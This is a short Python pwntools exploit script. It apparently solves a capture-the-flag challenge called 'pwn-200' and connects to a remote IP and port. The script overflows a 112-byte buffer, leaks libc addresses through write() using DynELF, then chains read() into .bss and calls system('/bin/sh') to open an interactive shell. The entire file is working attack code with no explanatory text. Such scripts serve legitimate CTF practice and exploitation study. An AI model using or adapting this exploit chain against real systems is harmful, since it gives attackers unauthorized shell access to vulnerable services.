#! /usr/bin/env python
from pwn import * 

p=remote("61.147.171.105",56444)
#p=process("pwn-200")
elf=ELF('pwn-200')
write_plt=elf.symbols['write']
write_got=elf.got['write']
read_plt=elf.symbols['read']
start_addr=0x080483d0
func_addr=0x08048484
ppp_addr=0x080485cd
def leak(address):
    payload1=b'a'*112+p32(write_plt)+p32(func_addr)+p32(1)+p32(address)+p32(4)
    p.send(payload1)
    data=p.recv(4)
    return data
print (p.recvline())
d=DynELF(leak,elf=ELF('./pwn-200'))
sys_addr=d.lookup('__libc_system','libc')
payload2=b'a'*112+p32(start_addr)
p.send(payload2)
print (p.recv())
bss_addr=elf.bss()
print ("bss_addr="+hex(bss_addr))
payload3=b'a'*112+p32(read_plt)+p32(ppp_addr)+p32(0)+p32(bss_addr)+p32(8)+p32(sys_addr)+p32(func_addr)+p32(bss_addr)
p.send(payload3)
p.send('/bin/sh')
p.interactive()